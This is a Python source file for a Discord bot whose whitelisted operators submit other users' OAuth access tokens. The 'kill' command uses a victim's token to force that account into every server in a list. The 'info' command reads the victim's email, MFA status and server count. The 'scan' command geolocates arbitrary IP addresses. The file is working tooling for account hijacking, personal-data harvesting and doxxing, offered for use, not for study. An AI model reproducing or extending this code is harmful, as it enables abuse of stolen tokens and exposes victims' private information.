import threading
import discord
import requests
from discord.ext import commands


bot = commands.Bot(command_prefix="r?",intents = discord.Intents.all())
token = ""
whitelist = []

server = open("guilds.txt","r").read().splitlines()
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name="Hentai uwu",url="https://twitch.tv/#"))



@bot.command()
async def updatewhite(ctx,member:discord.Member):
    global whitelist
    if ctx.author == ctx.guild.owner:
        whitelist.append(member.id)
        await ctx.send(embed=discord.Embed(title = f"`I'm Not Talking About Money, {member.name}`",description = "\n\n`I'm Talking Ideals.`",color = discord.Color.red()).set_image(url="https://cdn.discordapp.com/attachments/1010978953944645664/1020804816366211205/d7Czk-.gif"))


@bot.command()
async def white_list(ctx):
    a = ''
    if ctx.author.id in whitelist:
        for sexi in whitelist:
            a += f'{sexi}\n'
        await ctx.send(embed=discord.Embed(title="`So, This is The WhiteList?`",description = f"\n\n{a}",color = discord.Color.red()).set_image(url="https://cdn.discordapp.com/attachments/1010978953944645664/1020812044074758224/platinum-games-metal-gear-rising.gif"))



@bot.command()
async def kill(ctx,access):
    if ctx.author.id in whitelist:
        sex = requests.get('https://discordapp.com/api/users/@me',headers = {"authorization":f"Bearer {access}"})
        if sex.ok:
            json = sex.json()
            a = await ctx.send(f"`Sorry, {json['username']}`")
            def join(id):
              r = requests.put(f"https://discord.com/api/v10/guilds/{str(id)}/members/{json['id']}",headers = {'authorization':f'Bot {token}','content-type':'application/json'},
              json={
                    "nick": "Jack",
                    "access_token": access
                })
            #no dai che palle devo ricreare i server e aggiungere il bot
            #boh mi dice missing permissions
              print(r.json())
            for id in server:
                threading.Thread(target=join,args =(id,)).start()
            


@bot.command()
async def info(ctx,access):
 if ctx.author.id in whitelist:
        sex = requests.get('https://discordapp.com/api/users/@me',headers = {"authorization":f"Bearer {access}"})
        if sex.ok:
            json = sex.json()
            a = requests.get("https://discord.com/api/v10/users/@me/guilds",headers = {"authorization":f"Bearer {access}"}).json()
            await ctx.send(embed=discord.Embed(title= f"`{json['username']} Infos`", description = f"`His email: {json['email']}`\n\n`MFA: {json['mfa_enabled']}`\n\n`Verified:{json['verified']}`\n\n`Server Count: {len(a)}`",color = discord.Color.red()).set_image(url="https://cdn.discordapp.com/attachments/1010978953944645664/1020992905806094336/ayanokoji-raining.gif"))
            print(json)
        else: print(sex.json())



@bot.command()
async def scan(ctx,ip):
 if ctx.author.id in whitelist:
    a = requests.get(f"https://ipwhois.app/json/{ip}").json()
    if a['success'] == True:
        await ctx.send(embed= discord.Embed(title=f"`{ip} Lookup`", description = f"`Country: {a['country']}`\n\n`Region: {a['region']}`\n\n`Latitude: {a['latitude']}`\n\n`Longitude:{a['longitude']}`",color = discord.Color.red()).set_image(url="https://cdn.discordapp.com/attachments/1020749253653577840/1020996521996591104/icegif-525.gif"))
    


bot.run(token)


